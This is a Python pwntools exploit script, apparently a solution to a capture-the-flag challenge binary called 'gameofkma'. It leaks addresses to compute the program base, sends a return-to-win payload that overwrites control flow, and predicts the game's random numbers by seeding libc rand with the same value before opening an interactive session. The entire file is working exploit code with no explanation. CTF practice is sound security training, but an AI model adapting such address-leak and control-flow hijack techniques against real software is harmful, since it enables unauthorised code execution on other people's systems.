from pwn import *
from ctypes import*
libc = ELF('./libc-2.27.so', checksec=False)
glibc = cdll.LoadLibrary(libc.path)
context.binary=exe=ELF('./gameofkma_patched',checksec=False)
glibc.srand(0x1337)
p=process(exe.path)
def GDB():
    gdb.attach(p,gdbscript='''
        c
        ''')
    input()
GDB()

p.sendlineafter(b"How many trooper(s) do you want?(0-5)\n",b"5")
p.sendlineafter(b"How many monster do you want?(0-2)\n",b"2")
leak_list=p.recvuntil(b"How many hero",drop=True).split(b"\n")
#print(leak_list)
leak1=int.from_bytes(leak_list[0],"little")
exe.address=leak1-0x1e8a
leak2=int(leak_list[1].split(b' ')[1],16)
log.info('[+]leak1:'+hex(leak1))
log.info('[+]leak2:'+hex(leak2))
log.info('[+]exe base:'+hex(exe.address))
main=exe.address+0x1E8A
log.info('[+]main:'+hex(main))
b1=exe.address+0x2412
log.info('[+]b1:'+hex(b1))
p.sendlineafter(b"do you want?(0-2)\n",b"1")
pop_rdi=exe.address+0x0000000000002483
ret=exe.address+0x000000000000101a
win=exe.address+0x1D6D
input("enter")
payload=p64(ret)+p64(win+5)
p.sendafter(b'hero?\n', payload)
for i in range(5):
	p.sendlineafter(b"Do you wanna attack [1]monster or [0]trooper?(1/0)",b"0")

glibc.srand(0x1337)
for i in range(8):
	p.sendlineafter(b"Do you wanna attack [1]monster or [0]trooper?(1/0)",b"1")
	val=glibc.rand()%2022
	p.sendlineafter(b"think? > ",f"{val}".encode())

p.interactive()